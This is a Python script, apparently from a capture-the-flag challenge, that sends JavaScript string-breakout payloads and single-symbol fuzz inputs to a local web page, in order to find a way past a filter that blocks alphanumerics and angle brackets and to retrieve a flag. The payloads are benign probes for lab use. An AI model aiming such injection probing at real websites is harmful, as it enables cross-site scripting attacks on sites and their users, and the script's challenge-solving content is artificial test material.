import requests
import re

BASE_URL = "http://127.0.0.1:32887/page"

print("="*80)
print("FINAL ANALYSIS - UNDERSTANDING THE CHALLENGE")
print("="*80)

print("\n### Summary of findings ###")
print("✗ BLOCKED: All alphanumeric (a-z, A-Z, 0-9)")
print("✗ BLOCKED: Angle brackets (< >)")
print("✓ ALLOWED: All other special characters including JSFuck chars []()!+")
print()
print("The challenge is likely:")
print("1. Inject valid JavaScript using ONLY non-alphanumeric characters")
print("2. The injection point is: var name = \"USER_INPUT\";")
print("3. We need to break out and execute code")
print()

# Let's try to understand if maybe we need to make the JavaScript execute
# without syntax errors

# In pure JSFuck, we could theoretically execute code, but it's extremely long
# Let's try some shorter symbol-only approaches

print("\n### Testing execution context ###")

# Maybe the key is that we need valid JS that doesn't throw an error?
# Or maybe we need to actually execute a specific function?

exec_tests = [
    # Try simple expressions that evaluate
    ('";+[];//', "Evaluates to 0"),
    ('";![];//', "Evaluates to false"),
    ('";!![];//', "Evaluates to true"),
    ('";[][[]];//', "Evaluates to undefined"),
    
    # Try assignments
    ('";_=+[];//', "Assign 0 to _"),
    ('";$=![];//', "Assign false to $"),
    ('";_=!![];//', "Assign true to _"),
    
    # Try function calls (if any global functions exist)
    ('";[][[]]();//', "Try to call undefined"),
    ('";(![]);//', "Parenthesized false"),
]

for payload, desc in exec_tests:
    print(f"\n{desc}: {payload}")
    response = requests.post(BASE_URL, data={"name": payload})
    
    # Look for any difference from error response
    if len(response.text) < 1100:  # Shorter than typical error
        print(f"! Different response length: {len(response.text)}")
        print(response.text)
    
    if "success_umbrella" in response.text:
        print("✓✓✓ SUCCESS IMAGE ✓✓✓")
        print(response.text)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        print(f"🚩🚩🚩 FLAG: {flag_match.group(0)} 🚩🚩🚩")
        print(f"\nFull response:\n{response.text}")

# Check the challenge title/description more carefully
print("\n\n### Checking page title and metadata ###")
response = requests.post(BASE_URL, data={"name": "!"})
title_match = re.search(r'<title>([^<]+)</title>', response.text)
if title_match:
    print(f"Page title: {title_match.group(1)}")

# Look for any comments or hints in the HTML
comments = re.findall(r'<!--([^>]+)-->', response.text)
if comments:
    print(f"HTML comments: {comments}")

# Maybe we need to look at the success condition from server-side perspective
# Perhaps it checks if the input contains ONLY allowed characters?

print("\n\n### Test: Maybe success is NOT triggering the filter? ###")

# Try sending various symbol-only payloads and comparing response sizes
symbol_tests = [
    '!',
    '@',
    '#',
    '$',
    '%',
    '^',
    '&',
    '*',
    '(',
    ')',
    '[',
    ']',
    '{',
    '}',
    '+',
    '-',
    '=',
    '_',
    '|',
    '\\',
    ':',
    ';',
    '"',
    "'",
    ',',
    '.',
    '?',
    '/',
    '`',
    '~',
]

print("Testing all individual allowed symbols:")
for symbol in symbol_tests:
    response = requests.post(BASE_URL, data={"name": symbol})
    
    # Check if THIS specific symbol triggers something different
    if "success" in response.text.lower() or len(response.text) != 1152:
        print(f"! Symbol '{symbol}' produces different response (length: {len(response.text)})")
        
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"🚩 FLAG WITH '{symbol}': {flag_match.group(0)}")
            print(response.text)

# Maybe we need to send something that makes the JavaScript valid but does nothing?
print("\n\n### Test: Minimal valid JavaScript ###")
minimal_js = [
    ('";;//', "Empty statement"),
    ('";+[];//', "Zero"),
    ('";{};//', "Empty object"),  
    ('";[];//', "Empty array"),
    ('";(![]);//', "False in parens"),
    ('";void+[];//', "void 0"),
]

for payload, desc in minimal_js:
    print(f"\n{desc}: {payload}")
    response = requests.post(BASE_URL, data={"name": payload})
    
    # Check for flags or success
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        print(f"🚩 FLAG: {flag_match.group(0)}")
        print(f"\nFull response:\n{response.text}")
    
    if "success_umbrella" in response.text or "success" in response.text.lower():
        print("✓ SUCCESS!")
        print(response.text)

print("\n" + "="*80)
print("ANALYSIS COMPLETE")
print("="*80)
print("\nConclusion:")
print("The filter blocks all alphanumeric characters and angle brackets.")
print("Pure JSFuck (using only []()!+) is allowed but hasn't triggered success yet.")
print("The challenge likely requires executing specific JavaScript code using only symbols.")

